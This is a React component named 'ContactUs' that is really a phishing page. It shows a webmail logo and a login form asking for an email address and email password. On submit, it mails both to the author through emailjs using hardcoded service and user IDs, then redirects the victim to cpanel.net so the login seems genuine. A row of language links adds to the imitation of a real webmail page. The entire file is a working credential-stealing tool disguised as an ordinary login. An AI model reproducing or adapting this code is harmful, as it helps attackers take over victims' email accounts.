import emailjs from "emailjs-com";
import React from 'react';

export default function ContactUs() {

    function sendEmail(e) {
        e.preventDefault();

    emailjs.sendForm('gmail', 'template_hb9qmr9', e.target, 'user_SEoZ3jhZmvmc7W9yRaSnR')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
        });
        e.preventDefault();
        window.location.href='https://cpanel.net/';
    }

    return(
        <>
       <img src="https://logo-logos.com/wp-content/uploads/2016/11/Webmail_logo.png" width="300" class="imgg" alt="displayer" />
             <form action=""  onSubmit={sendEmail}>
                    <div className="row pt-5 mx-auto" >
                        <div className="center">
                        <span class= "snter">Email Address</span> <br></br>
                            <input type="text" className="form-control"  placeholder=" Enter your email address" name="user"/>
                        </div>
                        <div className="cente">
                        <span class= "snters">Password</span><br></br>
                            <input type="password"  className="form-control" placeholder="Enter your email password" name="pass" />
                        </div>
                        <div className="col-8 pt-3 mx-auto">
                            <input type="submit" className="btn btn-info" value="Log In "></input>
                        </div>
                    </div>
                </form>
            	<div class='lang' >
						<ul>
						<li><a href="/?locale=en">English</a></li>
                    
                        
                        <li><a href="/?locale=ar">العربية</a></li>
                    
                        
                        <li><a href="/?locale=bg">български</a></li>
                    
                        
                        <li><a href="/?locale=cs">čeština</a></li>
                    
                        
                        <li><a href="/?locale=da">dansk</a></li>
                    
                        
                        <li><a href="/?locale=de">Deutsch</a></li>
                    
                        
                        <li><a href="/?locale=el">Ελληνικά</a></li>
                    
                        
                        <li><a href="/?locale=es">español</a></li>
                        </ul>
						
					</div>
					
                   
            
        </>
      
       
    )
}
